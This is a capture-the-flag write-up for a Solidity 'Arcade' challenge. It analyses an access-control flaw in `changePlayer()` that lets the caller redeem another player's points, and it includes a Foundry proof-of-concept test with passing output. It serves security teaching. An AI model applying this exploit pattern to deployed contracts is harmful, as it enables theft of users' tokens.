# Challenge - Arcade

In this challenge, participants had to call `earn()` to accumulate points, then use `redeem()` to convert those points into tokens. However, the `earn()` function had a frequency limitation, making it difficult to gather enough points quickly.

Participants needed to devise a creative strategy to bypass this limitation and earn the necessary tokens to complete the challenge.

## Objective of

The objective of this challenge was to obtain over 200 Arcade tokens.

## Vulnerability Analysis

### Root Cause: Access Control

The `changePlayer()` function allowed anyone to redeem another player's points without proper authorization, as shown below:

```solidity
function changePlayer(address newPlayer) external onlyPlayer {
    address oldPlayer = currentPlayer;
    emit PlayerChanged(_redeem(oldPlayer), _setNewPlayer(newPlayer));
}

function redeem() external onlyPlayer {
    _redeem(msg.sender);
}


function _redeem(address player) internal returns (address) {
    uint256 points = getCurrentPlayerPoints();
    _mint(player, points);
    delete scoreboard[player];

    return player;
}
```

The challenge allocated initial points for each player as follows:

```solidity
// Set initial points for players
arcade.setPoints(you, 0);
arcade.setPoints(player1, 80);
arcade.setPoints(player2, 120);
arcade.setPoints(player3, 180);
arcade.setPoints(player4, 190);
```

By using the `changePlayer()` function, we can redeem Player 4's Arcade tokens.

### Attack steps:

1. Call `earn()` to accumulate points, then use `redeem()` to convert these points into tokens.
2. Call changePlayer() to redeem another player's Arcade tokens.

## PoC test case

```solidity
function testArcadeExploit() public {
    vm.warp(10 minutes);

    vm.startPrank(you);
    arcade.earn();
    arcade.redeem();
    arcade.changePlayer(player4);
    vm.stopPrank();

    arcadeBase.solve();
    assertTrue(arcadeBase.isSolved());
}
```

### Test Result

```
Ran 1 test for test/Arcade.t.sol:ArcadeTest
[PASS] testArcadeExploit() (gas: 133590)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 780.75µs (113.92µs CPU time)

Ran 1 test suite in 226.59ms (780.75µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
